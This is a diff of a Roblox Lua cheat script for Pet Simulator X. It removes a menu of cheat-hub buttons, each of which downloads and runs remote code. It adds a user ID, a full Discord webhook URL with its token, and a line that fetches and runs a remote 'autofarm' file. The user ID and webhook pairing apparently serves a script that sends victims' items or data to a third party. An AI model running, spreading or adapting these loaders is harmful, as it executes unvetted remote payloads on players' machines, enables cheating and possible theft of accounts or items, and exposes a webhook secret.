@@ -1,50 +1,5 @@
-local gui = loadstring(game:HttpGet("https://gitlab.com/0x45.xyz/droplib/-/raw/master/drop-minified.lua"))():Init(config,game.CoreGui)
+_G.UserID = 4122407052
 
-local lpg = gui:CreateCategory("Delta - Pet Simulator X")
+_G.WebHook = "https://discord.com/api/webhooks/1054780991438340258/ZdNqoVtEZ0ALrI4Wjl6sASSxEHFgnjwp7vQwZfv-YR5EZPrZWLyDposEHUUEUyynNmrX"
 
-lpg:CreateButton("BK Pet Hack GUI (#1 NO KEY SCRIPT)",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Scripts-Project-wd/opopop/main/Opdogegyt"))(); end)
-
-lpg:CreateButton("Mango Hub (#1 KEY SCRIPT)",function() loadstring(game:HttpGet'https://gitlab.com/L1ZOT/mango-hub/-/raw/main/Mango-Bloxf-Fruits-Beta')(); end)
-
-lpg:CreateButton("Thunder Z Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/ThunderZ-05/HUB/main/Script')(); end)
-
-lpg:CreateButton("DexHub Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/BinaryDex/DexHub/main/Init')(); end)
-
-lpg:CreateButton("Ultra Hub Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/ZaRdoOx/Ultra-Hub/main/Main')(); end)
-
-lpg:CreateButton("Delta (BEST SCRIPT but linkvertise)",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/lxnnydev/Delta-PSX/main/loader.lua')(); end)
-
-lpg:CreateButton("Vestra Hub Hack GUI",function()
-
-getgenv().key = "Vstra.V5_8e36047a9a0e05b8"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xandudiscord/vestra/main/loader.lua"))()
-
- 
-
-end)
-
-lpg:CreateButton("Void Hub Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/Wind596/VoidHub/main/WiningDediy')(); end)
-
-lpg:CreateButton("Ghost Hub Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/ScriptRUs/Ryans/main/GhostHub-PetSimX.lua')(); end)
-
-lpg:CreateButton("Meow Hub Hack GUI",function() loadstring(game:HttpGet'https://www.scriptblox.com/raw/Project-Meow_421')(); end)
-
-lpg:CreateButton("Dino Hub Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/SHAREHACK/script/main/psx')(); end)
-
-lpg:CreateButton("Emerald Hack GUI",function() loadstring(game:HttpGet'https://raw.githubusercontent.com/Sxdness0001/emerald-pet-sim/main/petsim')(); end)
-
-lpg:CreateButton("VG Hub Hack GUI",function() loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))() end)
-
-lpg:CreateButton("Uranium Hack GUI",function() loadstring(game:HttpGet("https://uraniumhub.tk/storage/script.lua", true))() end)
-
-lpg:CreateButton("Maxx Hub Hack GUI",function() loadstring(game:HttpGet(("https://aizen.ml/uploads/petsimx.txt")))() end)
-
-lpg:CreateButton("ShareHack Hub Hack GUI",function() loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/psx'))() end)
-
-lpg:CreateButton("XTools Hack GUI",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Boxking776/GrubHub/main/free/PSXFree.lua"))() end)
-
-lpg:CreateButton("ShinyTool Hack GUI",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/XLinestX/Shiny-Tool/main/ShinyTool.lua"))() end)
-
-lpg:CreateButton("Floppa Hub Hack GUI",function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Schervi/FloppaHub/main/FloppaHubMain.lua"))() end)
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SilenceScripts/PsxScripts.Lua/main/PsxAutofarm.true"))()
